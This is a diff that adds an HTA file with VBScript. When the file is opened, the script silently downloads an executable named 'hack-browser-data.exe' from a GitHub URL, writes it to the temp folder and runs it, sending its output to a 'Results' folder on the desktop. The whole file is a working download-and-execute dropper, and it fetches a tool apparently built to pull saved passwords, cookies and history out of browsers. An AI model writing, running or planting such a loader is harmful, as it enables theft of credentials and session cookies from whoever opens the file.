@@ -1,0 +1,57 @@
+<html>
+<head>
+<title>Download and Run EXE with Desktop Directory Argument</title>
+<HTA:APPLICATION 
+    ID="testHTA"
+    APPLICATIONNAME="DownloadAndRunWithDesktopDir"
+    SCROLL="no"
+    SINGLEINSTANCE="yes"
+/>
+<script language="VBScript">
+
+Sub Window_OnLoad
+    DownloadAndExecuteWithDesktopDir
+End Sub
+
+Sub DownloadAndExecuteWithDesktopDir()
+    ' Create XMLHTTP object to download the EXE file
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    exeUrl = "https://github.com/SAKIB-SALIM/Past/raw/refs/heads/main/hack-browser-data.exe" ' Change this to your EXE URL
+
+    ' Initiate request to download the file
+    http.Open "GET", exeUrl, False
+    http.Send
+
+    If http.Status = 200 Then
+        ' Create ADODB.Stream to hold the EXE in memory
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1 ' binary
+        stream.Open
+        stream.Write http.responseBody
+
+        ' Save EXE to temporary folder (necessary to run it with arguments)
+        tempPath = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) ' Temporary Folder
+        exeFilePath = tempPath & "\temp_exe_file.exe"
+
+        stream.SaveToFile exeFilePath, 2 ' Save to disk
+        stream.Close
+
+        ' Get the current user's desktop directory
+        Set objShell = CreateObject("WScript.Shell")
+        desktopPath = objShell.SpecialFolders("Desktop") + "Results"
+
+        ' Set the argument to --dir [Desktop]
+        exeArguments = "--dir """ & desktopPath & """"
+
+        ' Execute the EXE file with the desktop directory as argument
+        objShell.Run """" & exeFilePath & """ " & exeArguments, 1, True ' Wait for the EXE to finish
+    Else
+        MsgBox "Download failed: " & http.StatusText
+    End If
+End Sub
+
+</script>
+</head>
+<body>
+</body>
+</html>
